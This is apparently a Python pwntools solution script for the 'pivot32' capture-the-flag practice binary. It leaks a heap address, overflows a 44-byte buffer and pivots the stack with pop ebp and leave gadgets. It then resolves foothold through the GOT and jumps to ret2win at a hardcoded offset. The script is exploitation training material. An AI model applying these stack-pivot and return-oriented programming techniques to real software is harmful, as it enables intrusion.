from pwn import *
import re

system = 0x0804865a  # 0x0804865a <+14>: call   0x8048430 <system@plt>

pop_ebp = p32(0x0804892b);        # pop ebp; ret;
leave = p32(0x0804889f)           # leave; ret;  (mov esp, ebp; pop ebp)
pop_eax = p32(0x080488c0)         # pop eax; ret;
call_eax = p32(0x080486a3)        # call eax;
mov_eax_ptr_eax = p32(0x080488c4) # mov eax, dword ptr [eax]; ret;
add_eax_ebx = p32(0x080488c7)     # add eax, ebx; ret;
pop_ebx = p32(0x08048571)         # pop ebx; ret;
jmp_eax = p32(0x08048a5f)         # jmp eax;

ret2win = 0xf7fcc967
foothold = 0xf7fcc770

foothold_plt = p32(0x080485f0)
foothold_plt_got = p32(0x804a024)

offset = p32(ret2win - foothold)

# We could also use
# 0x080488c0: pop eax; ret;
# 0x080488c2: xchg eax, esp; ret;
def JumpToHeap(heap_addr):
  ret  = ""
  ret += pop_ebp
  ret += p32(heap_addr)
  ret += leave
  return ret

def CallRet2win():
  ret  = ""

  # Call foothold to resolve address
  ret += foothold_plt

  # Now address is resolved, we can dereference the pointer to it, add offset and call/jmp
  ret += pop_eax
  ret += foothold_plt_got
  ret += mov_eax_ptr_eax
  ret += pop_ebx
  ret += offset
  ret += add_eax_ebx
  ret += jmp_eax
  return ret


elf = ELF('pivot32')

io = process(elf.path)
leaked = io.recvuntil("> ")

# Get string by regex
hexreg = "0[xX][0-9a-fA-F]+"
m = re.search(hexreg, leaked)
heap = int(m.group(), 16)

pad = 'A'*44

print "heap addr: " + hex(heap)

rops = JumpToHeap(heap)

roph  = "AAAA" # pops into ebp in leave
roph += CallRet2win()

io.sendline(roph)
leaked = io.recvuntil("> ")
io.sendline(pad + rops)

recv = io.recvall()
log.success(recv)